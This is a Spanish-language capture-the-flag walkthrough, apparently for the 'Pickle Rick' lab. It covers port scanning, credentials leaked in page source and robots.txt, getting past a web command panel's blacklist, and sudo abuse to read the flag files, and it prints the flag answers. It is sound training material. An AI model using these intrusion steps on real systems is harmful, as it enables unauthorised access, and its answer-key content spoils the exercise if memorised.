## Objetivo
## Pistas
## Solución

```

¿Cuál es el primer ingrediente que necesita Rick?


┌──(kali㉿kali)-[~]
└─$ nmap -n -Pn -sV 10.10.145.54                
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-18 18:09 EDT
Nmap scan report for 10.10.145.54
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.30 seconds
                                                                                   
┌──(kali㉿kali)-[~]
└─$ 

Como no tenemos usuario ni contraseña SSH, podemos ignorar el puerto 22 por ahora y por lo tanto nos queda el puerto 80. Vamos a http://10.10.145.54

vemos el codigo fuente

  <!--
    Note to self, remember username!
    Username: R1ckRul3s
  -->


Entonces, tenemos un nombre de usuario como R1ckRul3s para SSH.

Había una carpeta /assets que contiene bastante información.

  background-image: url("assets/rickandmorty.jpeg");
    background-size: cover;
    height: 340px;

antes vamos a usar robots a ver si hay algo

view-source:http://10.10.145.54/robots.txt
Wubbalubbadubdub

Ahora si vamos a la carpeta
http://10.10.145.54/assets/

mm usemos gobuster por si acaso

vamos a ver si hay un login
http://10.10.145.54/login.php

Ahora ponemos lo reunido

 Username: R1ckRul3s
 PASS: Wubbalubbadubdub

entramos y sale un command panel

Aquí podemos ejecutar *algo* de código y obtener el resultado correspondiente. Ponemos ls y aquí obtenemos parte del contenido de la carpeta y allí tenemos nuestro primer ingrediente secreto como Sup3rS3cretPickl3Ingred.txt.

Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt

ponemos cat y no deja
buscamos mas opciones, intentamos less 

mr. meeseek hair

Inspeccionando la fuente, obtenemos la lista de comandos en la lista negra de la siguiente manera:

Por suerte, el comando ls no está en la lista negra. Ahora tenemos que comprobar los privilegios de sudo con sudo -l.

Matching Defaults entries for www-data on ip-10-10-70-235:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-70-235:
    (ALL) NOPASSWD: ALL

Podemos ejecutar comandos sudo sin contraseña

Para encontrar las otras dos banderas, escribimos sudo ls ../../../*

Aquí tenemos una lista de todas las carpetas y subcarpetas en la raíz. Al observar más de cerca, encontramos dos indicadores: /home/rick/second ingredients y /root/3rd.txt

ponemos tac ../../../home/rick/"second ingredients" 
como tiene espacio pon las comillas
1 jerry tear

Ahora vamos al otro
sudo ls ../../../root/3rd.txt
luego 
sudo less ../../../root/3rd.txt
3rd ingredients: fleeb juice

```
## Notas adicionales
## Referencias